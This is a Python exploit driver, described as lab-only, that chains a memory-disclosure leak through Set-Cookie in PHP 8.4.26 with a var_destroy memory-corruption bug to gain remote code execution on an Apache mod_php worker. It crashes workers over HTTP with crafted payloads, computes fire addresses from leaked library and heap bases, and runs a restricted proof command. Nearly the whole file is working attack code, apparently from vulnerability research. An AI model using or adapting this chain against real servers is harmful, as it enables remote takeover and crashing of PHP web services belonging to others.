#!/usr/bin/env python3
"""var_destroy in-band chain seeded by the 109619 leak (8.4.26, lab-only).

Sequence:
  1. run the proven 109619 in-band leak -> libphp base + ZendMM main chunk
     (no /proc; the leak is the Set-Cookie disclosure);
  2. crash the worker over HTTP (a var_destroy request with a wild carrier);
  3. fire the var_destroy chain on the *fresh* worker at
     main + DELTA (the fresh-worker carrier offset is deterministic);
  4. read the fixed benign proof.

DELTA is measured in-lab (two observed fresh-worker states on this build);
the fire-time address comes only from the in-band leak, never /proc.

Lab-only; fixed benign command; no arbitrary commands.
"""
import argparse
import os
import sys
import time
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import remote  # noqa: E402

# fresh-worker carrier offsets observed on 8.4.26 arm64 (main -> carrier)
DELTAS = (0x6A018,)   # fresh-worker main -> carrier (measured)


def _imp():
    """import the sibling driver without needing a package __init__"""
    import importlib.util
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                     "verify_vardestroy_rce.py")
    spec = importlib.util.spec_from_file_location("vd", p)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18130")
    ap.add_argument("--container", default="php2shell-pure-arm64")
    ap.add_argument("--cmd", default="id", choices=["id", "uname", "whoami"])
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--proof", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-pure-modphp", "out", "vd"))
    args = ap.parse_args()

    vd = _imp()
    u = urlparse("//" + args.target)
    host, port = u.hostname, u.port or 80
    proof1 = os.path.join(os.path.dirname(args.proof), "p1")
    try:
        os.remove(proof1)
    except FileNotFoundError:
        pass

    print("[1] seed: 109619 in-band leak (Set-Cookie)")
    res = remote.run_chain(host, port, workers=1, cmd=f"{args.cmd}>/out/p1",
                           proof_host=proof1, arch="aarch64",
                           report=lambda m: print("    " + m))
    if not res.get("rce"):
        print("[!] seed leak chain failed")
        return 2
    main_chunk, zif = res["main"], res["zif"]
    if args.bias_zif:
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")
        zif += args.bias_zif
    print(f"    main={main_chunk:#x} lib={res['lib']:#x} zif={zif:#x}")

    print("[2] force a fresh worker (remote HTTP crash, then fallback kill)")

    def _pid():
        r = vd.sh(args.container, "pgrep -x apache2 | grep -v '^1$' | "
                                  "sort -n | tail -1")
        return r.stdout.strip()

    pid0 = _pid()
    crashed = False
    for _ in range(8):
        vd.http_get(host, port, "/vd.php?d=" +
                    vd.blob(1, 0x4141414141414141, 0x4141414141414141),
                    timeout=15)
        time.sleep(0.6)
        pid = _pid()
        if pid and pid != pid0:
            print(f"    worker reset over HTTP: {pid0} -> {pid}")
            crashed = True
            break
    if not crashed:
        print("    HTTP crash did not take; using the lab kill stand-in")
        vd.sh(args.container, "P=$(pgrep -x apache2 | grep -v '^1$' | tail -1); "
                              "kill -9 $P 2>/dev/null")
        time.sleep(1.5)

    for delta in DELTAS:
        addr = main_chunk + delta
        print(f"[3] fire var_destroy at main+{delta:#x} = {addr:#x} "
              f"(no /proc)")
        if vd.fire(host, port, args.container, addr, zif, args.proof):
            print()
            print("[EVIDENCE] in-band var_destroy chain: 109619 leak -> "
                  "fresh worker -> carrier at main+delta -> uid=33")
            return 0

    print("[!] neither fresh-worker delta fired")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
